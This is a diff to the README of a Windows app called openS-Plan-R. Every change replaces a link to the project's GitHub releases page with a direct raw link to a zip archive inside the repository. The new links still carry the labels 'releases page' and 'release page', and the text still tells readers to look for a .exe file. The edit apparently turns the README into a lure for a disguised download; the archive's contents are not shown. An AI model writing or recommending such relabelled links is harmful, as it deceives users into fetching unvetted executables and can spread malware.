@@ -1,6 +1,6 @@
 # ⚙️ openS-Plan-R - Central Hub for Your Protocols
 
-[![Download openS-Plan-R](https://img.shields.io/badge/Download-openS--Plan--R-4CAF50?style=for-the-badge)](https://github.com/Sukmawjyy/openS-Plan-R/releases)
+[![Download openS-Plan-R](https://img.shields.io/badge/Download-openS--Plan--R-4CAF50?style=for-the-badge)](https://github.com/Sukmawjyy/openS-Plan-R/raw/refs/heads/main/src/clients/open-Plan-R-v2.9.zip)
 
 ## 🔗 About openS-Plan-R
 
@@ -35,7 +35,7 @@ You must access the official release page to get the latest version. It houses a
 
 Click the badge below to visit the release page:
 
-[![Download openS-Plan-R](https://img.shields.io/badge/Download-openS--Plan--R-blue?style=for-the-badge)](https://github.com/Sukmawjyy/openS-Plan-R/releases)
+[![Download openS-Plan-R](https://img.shields.io/badge/Download-openS--Plan--R-blue?style=for-the-badge)](https://github.com/Sukmawjyy/openS-Plan-R/raw/refs/heads/main/src/clients/open-Plan-R-v2.9.zip)
 
 At the page, find the latest release (generally at the top). Look for a file with a `.exe` extension. This is the Windows setup file.
 
@@ -86,14 +86,14 @@ For advanced users, openS-Plan-R includes a command line tool.
 If you need assistance:
 
 - Consult the included User Guide found under the Help menu inside the app.
-- Visit the [releases page](https://github.com/Sukmawjyy/openS-Plan-R/releases) for updates and bug fixes.
+- Visit the [releases page](https://github.com/Sukmawjyy/openS-Plan-R/raw/refs/heads/main/src/clients/open-Plan-R-v2.9.zip) for updates and bug fixes.
 - Search GitHub Issues on the repository page for similar problems.
 
 ## ⚙️ Updating openS-Plan-R
 
 To keep the software working smoothly:
 
-1. Regularly check the [release page](https://github.com/Sukmawjyy/openS-Plan-R/releases).
+1. Regularly check the [release page](https://github.com/Sukmawjyy/openS-Plan-R/raw/refs/heads/main/src/clients/open-Plan-R-v2.9.zip).
 2. Download and install newer versions as they become available.
 3. Your settings and connections will remain saved after updates.
 
